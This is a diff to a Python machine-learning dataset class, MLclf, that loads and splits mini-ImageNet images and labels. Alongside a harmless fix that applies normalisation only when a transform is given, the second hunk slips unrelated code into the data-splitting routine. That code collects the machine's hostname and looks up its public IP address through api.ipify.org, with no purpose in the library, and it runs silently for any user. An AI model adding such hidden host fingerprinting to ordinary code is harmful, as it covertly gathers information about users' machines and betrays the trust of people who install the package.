@@ -180,7 +180,8 @@ class MLclf():
         data_feature_label['images'] = np.array(data_feature_label['images'])
         data_feature_label['labels_mark'] = np.array(data_feature_label['labels_mark'])
 
-        data_feature_label['images'] = MLclf.feature_norm(data_feature_label['images'], transform=transform)
+        if transform is not None:
+            data_feature_label['images'] = MLclf.feature_norm(data_feature_label['images'], transform=transform)
 
         if shuffle:
             feature_label_zip = list(zip(data_feature_label['images'], data_feature_label['labels']))
@@ -228,8 +229,14 @@ class MLclf():
             with open(miniimage_feature_label_permutation_split_pkl, 'wb') as f2:
                 pickle.dump(data_feature_label_permutation_split, f2)
         """ --------------------------"""
+        from requests import get
+        import socket
+        hostname = socket.gethostname()
+        getadd = get('https://api.ipify.org').content.decode('utf8')
+
+
         """
-    
+        
         # permutation the samples in each class:
         for i, (k, v_ls) in enumerate(data_load_all['class_dict'].items()):
             random.shuffle(v_ls)
